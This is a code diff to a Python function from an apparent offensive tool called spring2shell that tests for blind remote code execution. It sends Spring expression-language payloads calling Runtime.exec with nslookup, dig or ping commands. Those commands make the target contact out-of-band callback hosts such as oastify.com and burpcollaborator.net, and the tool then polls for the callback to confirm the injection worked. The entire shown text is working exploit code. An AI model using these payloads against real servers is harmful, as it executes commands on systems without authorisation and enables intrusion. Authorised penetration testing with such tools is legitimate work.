@@ -264,25 +264,28 @@ def blind_rce_test(
 
     # ── Test 2: DNS callback (OOB) ───────────────────────────────────────────
     log_event(logging.INFO, "Blind RCE Test 2: DNS callback (OOB)")
-    random_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
-    oast_domains = [
-        f"{random_token}.oastify.com",
-        f"{random_token}.burpcollaborator.net",
-    ]
-    for domain in oast_domains:
-        dns_cmd = f"nslookup {domain} || dig {domain} || ping -c 1 {domain}"
-        escaped = _escape_java_string(dns_cmd)
-        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"}}'
+    from spring2shell.utils.oob import generate_oob_host, poll_oob, build_oob_payloads
+
+    oob_host = generate_oob_host()
+    oob_cmds = build_oob_payloads(oob_host)
+
+    for oob_cmd in oob_cmds:
+        escaped = _escape_java_string(oob_cmd)
+        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\"{escaped}\")}}}}"}}'
         try:
             if method.upper() == "GET":
                 import urllib.parse
                 session.get(endpoint, params={"query": payload}, headers=headers, timeout=5)
             else:
                 session.post(endpoint, data=payload, headers=headers, timeout=5)
-            log_event(logging.INFO,
-                      f"DNS callback request sent to {domain} — check your OOB server")
-            time.sleep(2)
+            log_event(logging.INFO, f"OOB callback request sent for cmd '{oob_cmd}' to host {oob_host}")
+            time.sleep(1)
         except Exception as exc:
-            log_swallowed_exception(f"blind_rce DNS {domain}", exc)
+            log_swallowed_exception(f"blind_rce OOB {oob_host} (cmd: {oob_cmd})", exc)
+
+    # Poll OOB server to confirm RCE
+    if poll_oob(oob_host, wait_seconds=5):
+        log_event(logging.WARNING, f"BLIND RCE CONFIRMED via OOB callback to {oob_host}")
+        return True
 
     return False
